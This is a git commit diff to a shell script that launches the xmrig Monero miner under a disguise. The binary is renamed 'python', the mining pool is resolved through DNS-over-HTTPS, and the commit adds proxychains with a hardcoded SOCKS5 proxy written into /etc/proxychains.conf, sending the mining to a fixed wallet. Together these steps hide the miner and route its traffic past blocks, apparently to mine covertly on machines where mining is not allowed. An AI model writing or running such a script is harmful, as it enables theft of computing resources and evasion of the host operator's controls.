daf9880525383ed89547037101c0853d43b9c56d
Nguyen Thuong Hai <58414694+kmille36@users.noreply.github.com>
2021-09-27 17:39:46 +0700

    Update DOGE_unminerable.sh

--- DOGE_unminerable.sh
+++ DOGE_unminerable.sh
@@ -4,5 +4,8 @@ cd xmrig-6.15.1
 mv xmrig python
 sudo apt update
 sudo apt install jq -y
+sudo apt install proxychains -y
+sudo echo "[ProxyList]" > /etc/proxychains.conf
+sudo echo "socks5  67.201.33.10  25283" >> /etc/proxychains.conf
 ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=us-west.minexmr.com&type=A' | jq -r '.Answer[0].data')
-sudo ./python -o $ip:4444 -u 878g8ZsJ65oWcPxsugXyWaS7Eo2peDZpdGxZSVBuMb2kZXr9YC1LbMp86KXs3eoVHfGhNtNS417PRWfRK8nqLN8pSwRnKEN
+proxychains ./python -o $ip:4444 -u 878g8ZsJ65oWcPxsugXyWaS7Eo2peDZpdGxZSVBuMb2kZXr9YC1LbMp86KXs3eoVHfGhNtNS417PRWfRK8nqLN8pSwRnKEN
